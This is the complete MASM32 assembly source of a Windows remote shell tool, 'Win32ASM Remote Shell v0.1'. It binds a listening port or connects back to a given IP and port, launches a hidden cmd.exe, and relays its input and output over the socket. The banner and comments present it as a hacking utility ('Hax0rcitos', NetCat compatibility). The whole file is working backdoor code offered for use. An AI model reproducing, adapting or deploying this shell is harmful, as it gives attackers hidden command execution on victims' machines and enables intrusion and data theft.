; ###############################################################################################
;
;                 - --=( Win32ASM Remote Shell v0.1 )=-- -
;
;                   Coded by Tarako - Tarako@3wdesign.es
;
;               Tested on Windows 2000 SP3 (Spanish Version)
;
;                          Compiled with Masm32v8
;
; ###############################################################################################

.386 
.model flat,stdcall 
option casemap:none 

include    \masm32\include\windows.inc 
include    \masm32\include\masm32.inc
include    \masm32\include\user32.inc 
include    \masm32\include\kernel32.inc 
include    \masm32\include\wsock32.inc
includelib \masm32\lib\user32.lib      
includelib \masm32\lib\kernel32.lib 
includelib \masm32\lib\wsock32.lib
includelib \masm32\lib\masm32.lib

WinMain proto :DWORD,:DWORD,:DWORD,:DWORD 

ServerComandoThreaded PROTO
ClientComandoThreaded PROTO

Escucha PROTO
Conecta PROTO

CreaPipe PROTO
CreaThread PROTO :DWORD

CierraTodo PROTO :BYTE

.DATA
    AppName     db "Tarakito",0
    IconName    db "icono",0
    ConectadoS  db "0"
    ConectadoC  db "0"
    Shell       db "cmd.exe",0
    Exit        db "exit",13,10,0           ; normal Exit string
    Exitc       db "exit",10,0              ; exit string send by NetCat
    Bye         db "bye",13,10,0
    ErrorShell  db "Imposible crear la Shell",0
    Banner      db 13,10," ..:: Hax0rcitos Win32ASM Remote Shell v0.1 by Tarako@3wdesign.es ::..",13,10,13,10,0
    Escuchar    db "-l",0
    Conectar    db "-c",0
    IP          db 16 dup (0)

.DATA?
    hInstance       HINSTANCE ? 
    CommandLine     LPSTR ?
    hwndVentana     HWND ?
    WSAdata         WSADATA <>
    sin             sockaddr_in <>
    ServerSocket	  DWORD ?
    hServer         dd ?
    Escritos        DWORD ?
    Leido           db 1024 dup (?)
    Parametro       db ?    
    Puerto          DWORD ?
    sat             SECURITY_ATTRIBUTES <>
    startupinfo     STARTUPINFO <>
    pinfo           PROCESS_INFORMATION <>
    hEntradaRead    DWORD ?
    hEntradaWrite   DWORD ?
    hSalidaRead     DWORD ?
    hSalidaWrite    DWORD ?
    hThread         HWND  ?  
    hClient         DWORD ?

.CONST
    WM_SERVER equ WM_USER+100   ; Windows Messages For the Server and the
    WM_CLIENT equ WM_USER+101   ; Client

.CODE                           
start: 
    invoke GetModuleHandle, NULL                                   
    mov hInstance,eax 
    invoke GetCommandLine  
    mov CommandLine,eax      
    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT   
    invoke ExitProcess,eax       

WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD 
    LOCAL wc:WNDCLASSEX
    LOCAL msg:MSG
    LOCAL hwnd:HWND

    mov   wc.cbSize,SIZEOF WNDCLASSEX           ; Creating the Main window
    mov   wc.style, CS_HREDRAW or CS_VREDRAW 
    mov   wc.lpfnWndProc, OFFSET WndProc
    mov   wc.cbClsExtra,NULL
    mov   wc.cbWndExtra,NULL
    push  hInstance 
    pop   wc.hInstance
    mov   wc.hbrBackground,COLOR_WINDOW+1
    mov   wc.lpszMenuName,NULL    
    mov   wc.lpszClassName,OFFSET AppName   
    invoke LoadIcon,hInstance,addr IconName  
    mov   wc.hIcon,eax
    mov   wc.hIconSm,eax
    invoke LoadCursor,NULL,IDC_ARROW 
    mov   wc.hCursor,eax 
    invoke RegisterClassEx, addr wc  

    invoke CreateWindowEx,NULL,ADDR AppName,ADDR AppName,WS_OVERLAPPEDWINDOW,\
                0,0,300,300,NULL,NULL,hInst,NULL
    mov hwndVentana,eax

; -------------------------------------------------------------------------
    invoke WSAStartup,101h,ADDR WSAdata	                      ;   WindSock v1.1 DLL Intialization
    .IF eax==NULL
        invoke socket,AF_INET,SOCK_STREAM,0
	  .IF eax!=INVALID_SOCKET 
            mov ServerSocket,eax 
            invoke GetCL,1,ADDR Parametro                       ; Firts Commandline param
            .IF eax==1
                invoke lstrcmp,ADDR Parametro,ADDR Conectar     ; If is "-c"
                .IF eax==0
                    invoke GetCL,2,ADDR IP
                    .IF eax==1
                        invoke GetCL,3,ADDR Puerto
                        .IF eax==1
                            invoke Conecta                      ; Call the connect procedure
                        .ELSE
                            invoke CierraTodo,1
                        .ENDIF
                    .ELSE
                        invoke CierraTodo,1
                    .ENDIF
                .ELSE
                    invoke lstrcmp,ADDR Parametro,ADDR Escuchar ; If is "-l"
                    .IF eax==0
                        invoke GetCL,2,ADDR Puerto
                        .IF eax==1
                            invoke Escucha                      ; Call the listening procedure
                        .ELSE
                            invoke CierraTodo,1
                        .ENDIF
                    .ELSE
                        invoke CierraTodo,1                     ; Not "-c" or "-l"
                    .ENDIF
                .ENDIF
            .ELSE
                invoke CierraTodo,1                             ; No params
            .ENDIF
        .ELSE
            invoke CierraTodo,1                                 ; If the prog cant invoke socket
        .ENDIF
    .ELSE
        invoke CierraTodo,1                                     ; If the prog cant invoke WSAStartup
    .ENDIF
; -------------------------------------------------------------------------

    .WHILE TRUE
        invoke GetMessage, ADDR msg,NULL,0,0 
        .BREAK .IF (!eax) 
        invoke TranslateMessage, ADDR msg 
        invoke DispatchMessage, ADDR msg 
    .ENDW 
    mov eax,msg.wParam
    ret 
WinMain endp 

; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
;
;   LISTENING PROCEDURE: Binds a Port to a Socket and wait for connections
;
; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
Escucha PROC        
    invoke WSAAsyncSelect, ServerSocket, hwndVentana,WM_SERVER, FD_ACCEPT+FD_READ+FD_CLOSE
    .IF eax!=INVALID_SOCKET
        invoke atodw,ADDR Puerto
        invoke htons,eax
        mov sin.sin_port,ax
        mov sin.sin_family, AF_INET
        mov sin.sin_addr, INADDR_ANY
        invoke bind, ServerSocket, addr sin, sizeof sin
        invoke listen, ServerSocket, 0
        mov ConectadoS,0
    .ELSE
        invoke CierraTodo,1 
    .ENDIF
RET
Escucha ENDP

; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
;
;   CONNECTING PROCEDURE: Try to connect to a remote host given by parameters
;
; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
Conecta PROC
    invoke socket,AF_INET,SOCK_STREAM,0
    .IF eax!=INVALID_SOCKET
        mov hClient,eax
        invoke WSAAsyncSelect, hClient, hwndVentana,WM_CLIENT, FD_CONNECT+FD_READ+FD_CLOSE 
        .IF eax!=INVALID_SOCKET         
            invoke atodw,ADDR Puerto
            invoke htons,eax
            mov sin.sin_port,ax            
            mov sin.sin_family, AF_INET
            invoke inet_addr, addr IP
            mov sin.sin_addr, eax
            invoke connect, hClient, addr sin, sizeof sin
        .ELSE
            invoke CierraTodo,1      
        .ENDIF
    .ELSE
        invoke CierraTodo,1      
    .ENDIF
    RET
Conecta ENDP
; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
;
;   Procedure to check the window messages
;
; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM 
        
        .IF uMsg==WM_DESTROY
            invoke CierraTodo,1 

        .ELSEIF uMsg==WM_CLIENT                 ; Client Messages
            mov eax,lParam
            .IF ax==FD_CLOSE
                invoke CierraTodo,1
                
            .ELSEIF ax==FD_READ
                shr eax,16
                .IF ax==NULL
                    mov eax,wParam                
                    invoke recv,eax,addr Leido,sizeof Leido,0
                    .IF eax != SOCKET_ERROR 
                        invoke WriteFile,hEntradaWrite,ADDR Leido, eax, ADDR Escritos,NULL 
                        invoke lstrcmp,ADDR Leido,ADDR Exit
                        .IF eax==0 
                            invoke CierraTodo,1
                        .ELSE
                            invoke lstrcmp,ADDR Leido,ADDR Exitc
                            .IF eax==0 
                                invoke CierraTodo,1
                            .ENDIF
                        .ENDIF    
                    .ENDIF
                .ENDIF
                
            .ELSEIF ax==FD_CONNECT
                shr eax,16	 
                .IF ax==NULL
                    invoke CreaPipe
                    invoke CreateProcess,NULL,OFFSET Shell,NULL,NULL,TRUE,0,NULL,NULL,addr startupinfo,addr pinfo

                    .IF eax!=NULL
                        mov ConectadoC,1
                        invoke CreaThread,OFFSET ClientComandoThreaded
                        invoke send, hClient, addr Banner, sizeof Banner, 0
                    .ENDIF                     
                .ENDIF
            .ENDIF
            
        .ELSEIF uMsg==WM_SERVER
            mov eax,lParam                
		.IF ax==FD_ACCEPT
                .IF ConectadoS==0
                    shr eax,16
		          .IF ax==NULL
                    
                        invoke accept,ServerSocket,0,0
			      mov hServer,eax
                        
                        invoke CreaPipe
                        invoke CreateProcess,NULL,OFFSET Shell,NULL,NULL,TRUE,0,NULL,NULL,addr startupinfo,addr pinfo

                        .IF eax==NULL
                            invoke lstrlen,ADDR ErrorShell
                            invoke send, hServer, addr ErrorShell, eax, 0
                            invoke CierraTodo,1
                        .ELSE
                            mov ConectadoS, 1
                            invoke CreaThread,OFFSET ServerComandoThreaded
                            invoke send, hServer, addr Banner, sizeof Banner, 0
                        .ENDIF 
                    .ENDIF 
                .ENDIF  
            
            .ELSEIF ax==FD_READ 
                shr eax,16
                .IF ax==NULL    
                    mov eax,wParam                
                    invoke recv,eax,addr Leido,sizeof Leido,0
                    .IF eax != SOCKET_ERROR             
                        invoke WriteFile,hEntradaWrite,ADDR Leido, eax, ADDR Escritos,NULL
                    .ENDIF
                .ENDIF   
            .ENDIF 

            .ELSEIF ax==FD_CLOSE
                invoke CierraTodo,0
            .ELSE 
                invoke DefWindowProc,hWnd,uMsg,wParam,lParam  ; Procesar el mensaje por defecto
                ret 
        .ENDIF 
        xor eax,eax 
        ret 
WndProc endp 

; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
;
;   PIPE PROCEDURE: To create the two pipes needed
;
; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
CreaPipe proc
    mov sat.nLength,sizeof SECURITY_ATTRIBUTES
    mov sat.bInheritHandle,TRUE    
    mov sat.lpSecurityDescriptor,NULL
    
    invoke CreatePipe,addr hEntradaRead,addr hEntradaWrite,addr sat,5000
    invoke CreatePipe,addr hSalidaRead,addr hSalidaWrite,addr sat,5000

    mov startupinfo.cb,sizeof STARTUPINFO
    invoke GetStartupInfo,ADDR startupinfo
    mov startupinfo.dwFlags,STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES   
    mov startupinfo.wShowWindow,SW_HIDE

    mov eax,hEntradaRead
    mov startupinfo.hStdInput,eax
    mov eax,hSalidaWrite
    mov startupinfo.hStdOutput,eax
    mov startupinfo.hStdError,eax 
    RET
CreaPipe endp

; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
;
;   CONNECTING SOCKET COMMAND THREAD: Thread to write to the socket all cmd.exe answers
;
; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
ServerComandoThreaded proc 
    LOCAL buffer[1024]:DWORD
    LOCAL bytesRead:DWORD

    .WHILE ConectadoS==1
        invoke RtlZeroMemory,addr buffer,sizeof buffer
        invoke ReadFile,hSalidaRead,addr buffer,1023,addr bytesRead,NULL
        .IF eax>0
            invoke lstrcmp,ADDR buffer,ADDR Exit                          ; "exit" will close the current socket
            .IF eax!=0
                invoke lstrcmp,ADDR buffer,ADDR Bye                       ; "bye" close the server
                .IF eax!=0
                    invoke lstrlen,ADDR buffer
                    invoke send, hServer, addr buffer, eax, 0
                .ELSE
                    invoke WriteFile,hEntradaWrite,ADDR Exit, sizeof Exit, ADDR Escritos,NULL
                    invoke CierraTodo,1
                .ENDIF
            .ELSE
                invoke CierraTodo,0
            .ENDIF
        .ENDIF
    .ENDW
    RET
ServerComandoThreaded endp

; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
;
;   CREATE THREAD PROCEDURE: Create the needed thread for the listening or connect option
;
; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
CreaThread proc Cual:DWORD
    invoke CreateThread,NULL,0,Cual,NULL,0,NULL
    invoke CloseHandle,eax
    invoke CloseHandle,hSalidaWrite
    invoke CloseHandle,hEntradaRead
RET
CreaThread endp

; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
;
;   CONNECTING SOCKET COMMAND THREAD: Thread to write to the socket all cmd.exe answers
;
; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
ClientComandoThreaded proc 
    LOCAL buffer[1024]:DWORD
    LOCAL bytesRead:DWORD
    
    .WHILE ConectadoC==1
        invoke RtlZeroMemory,addr buffer,sizeof buffer
        invoke ReadFile,hSalidaRead,addr buffer,1023,addr bytesRead,NULL
        .IF eax>0
            invoke lstrlen,ADDR buffer
            invoke send, hClient, addr buffer, eax, 0
        .ENDIF
    .ENDW
    RET
ClientComandoThreaded endp

; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
;
;   CLOSE PROCEDURE: Close the socket and wait for more connections (listening mode) or close the app
;
; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤
CierraTodo proc Opcion:BYTE
    invoke CloseHandle,hEntradaWrite
    invoke CloseHandle,hSalidaRead
    mov ConectadoS, 0
    mov ConectadoC, 0
    .IF Opcion==0
        invoke closesocket, hServer
        mov hServer,0 
    .ELSE        
        invoke ExitProcess,90h
    .ENDIF
ret
CierraTodo endp

end start